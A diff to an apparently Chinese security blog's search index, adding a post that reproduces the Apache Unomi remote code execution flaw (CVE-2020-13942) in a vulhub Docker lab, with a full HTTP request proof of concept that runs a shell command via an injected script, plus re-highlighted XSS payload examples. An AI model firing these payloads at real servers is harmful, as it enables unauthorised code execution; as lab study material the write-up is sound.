@@ -3,6 +3,67 @@
   
     
     <entry>
+      <title><![CDATA[Apache Unomi 远程代码执行漏洞]]></title>
+      <url>/2021/02/07/CVE-2020-13942/</url>
+      <content type="html"><![CDATA[<h1 id="Apache-Unomi-远程代码执行漏洞"><a href="#Apache-Unomi-远程代码执行漏洞" class="headerlink" title="Apache Unomi 远程代码执行漏洞"></a>Apache Unomi 远程代码执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Unomi是一个Java开源客户数据平台，这是一个Java服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。<code>Apache Unomi &lt; 1.5.2</code>版本存在执行任意代码漏洞。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过<code>docker-compose</code>、依托vulhub靶场的提供的镜像构建，以下是<code>docker-compose.yml</code>配置</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr"> web:</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">vulhub/unomi:1.5.1</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"9443:9443"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"8181:8181"</span></span><br><span class="line"><span class="attr">   environment:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">UNOMI_ELASTICSEARCH_ADDRESSES=elasticsearch:9200</span></span><br><span class="line"><span class="attr">   depends_on:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">elasticsearch</span></span><br><span class="line"><span class="attr"> elasticsearch:</span></span><br><span class="line"><span class="attr">   image:</span> <span class="attr">elasticsearch:7.9.3</span></span><br><span class="line"><span class="attr">   environment:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">cluster.name=contextElasticSearch</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">discovery.type=single-node</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">bootstrap.memory_lock=true</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd unomi</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h3><figure class="image-box">
+                <img src="/img/CVE-2020-13942/image-20210204140318166.png" alt="image-20210204140318166" title class>
+                <p>image-20210204140318166</p>
+            </figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">web_1            | OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00000000b768b000, 142548992, 0) failed; error='Cannot allocate memory' (errno=12)</span><br><span class="line">web_1            | #</span><br><span class="line">web_1            | # There is insufficient memory for the Java Runtime Environment to continue.</span><br><span class="line">web_1            | # Native memory allocation (mmap) failed to map 142548992 bytes for committing reserved memory.</span><br><span class="line">web_1            | # An error report file with more information is saved as:</span><br><span class="line">web_1            | # /usr/local/unomi/hs_err_pid181.log</span><br></pre></td></tr></table></figure>
+
+<p>通过报错信息发现是JVM虚拟机内存不足，这里尝试将内存调小一些。关于<code>JAVA_OPTS</code>可以百度</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>修改docker-compose.yml如下,原本是512这里我改成256</span><br><span class="line">    - "ES_JAVA_OPTS=-Xms256m -Xmx256m"</span><br></pre></td></tr></table></figure>
+
+<p>重启即可。</p>
+<figure class="image-box">
+                <img src="/img/CVE-2020-13942/image-20210204142554215.png" alt="image-20210204142554215" title class>
+                <p>image-20210204142554215</p>
+            </figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>这里以8181端口为例，9433端口同样适用</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /context.json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">47.107</span><span class="number">.132</span><span class="number">.6</span>:<span class="number">8181</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,en-US;q=<span class="number">0.5</span>,en;q=<span class="number">0.3</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: <span class="number">1</span></span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">493</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"filters"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"id"</span>: <span class="string">"sample"</span>,</span><br><span class="line">            <span class="string">"filters"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">"condition"</span>: &#123;</span><br><span class="line">                         <span class="string">"parameterValues"</span>: &#123;</span><br><span class="line">                            <span class="string">""</span>: <span class="string">"script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/rec\");"</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"profilePropertyCondition"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"sessionId"</span>: <span class="string">"sample"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="/img/CVE-2020-13942/image-20210204151527235.png" alt="image-20210204151527235" title class>
+                <p>image-20210204151527235</p>
+            </figure>
+
+<h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><figure class="image-box">
+                <img src="/img/CVE-2020-13942/image-20210204151614924.png" alt="image-20210204151614924" title class>
+                <p>image-20210204151614924</p>
+            </figure>
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
+<li><a href="https://mp.weixin.qq.com/s/Ed87f8bQ-RAshBjva7pGaw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ed87f8bQ-RAshBjva7pGaw</a></li>
+<li><a href="https://blog.csdn.net/qq_37602797/article/details/110010273" target="_blank" rel="noopener">https://blog.csdn.net/qq_37602797/article/details/110010273</a></li>
+<li><a href="https://www.cnblogs.com/Found404/p/14331006.html" target="_blank" rel="noopener">https://www.cnblogs.com/Found404/p/14331006.html</a></li>
+<li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> 漏洞复现 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[web安全-SSTI]]></title>
       <url>/2021/02/06/SSTI/</url>
       <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><blockquote>
@@ -1293,7 +1354,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 用户输入内容 --&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>payload：<code>--&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;!--</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- --&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="comment">&lt;!-- --&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>用户输入作为标签属性名</li>
@@ -1301,7 +1362,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> 用户输入=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>payload：<code>&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"xxx"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>用户输入作为标签属性值</li>
@@ -1309,7 +1370,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"用户输入"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>payload：<code>&quot;&gt;&lt;/div&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;div a=&quot;x</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">div</span> <span class="attr">a</span>=<span class="string">"x"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>用户输入作为标签名</li>
@@ -1317,7 +1378,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">用户输入</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>payload：<code>&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;b</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">b</span> <span class="attr">id</span>=<span class="string">"xx"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>用户输入作为CSS内容</li>
@@ -1325,7 +1386,7 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span>用户输入内容<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>payload：<code>&lt;/style&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;style&gt;</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert('xss')<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'xss'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="不能闭合标签"><a href="#不能闭合标签" class="headerlink" title="不能闭合标签"></a>不能闭合标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">keyword</span>  <span class="attr">value</span>=<span class="string">'输入内容'</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -3423,9 +3484,9 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
         
         <tags>
             
-            <tag> VUE </tag>
-            
             <tag> 前端 </tag>
+            
+            <tag> VUE </tag>
             
         </tags>
         
@@ -3872,9 +3933,9 @@ information_schema.tables where table_schema=database() limit 0,1))=5,sleep(5),1
         
         <tags>
             
-            <tag> VUE </tag>
-            
             <tag> 前端 </tag>
+            
+            <tag> VUE </tag>
             
         </tags>
         
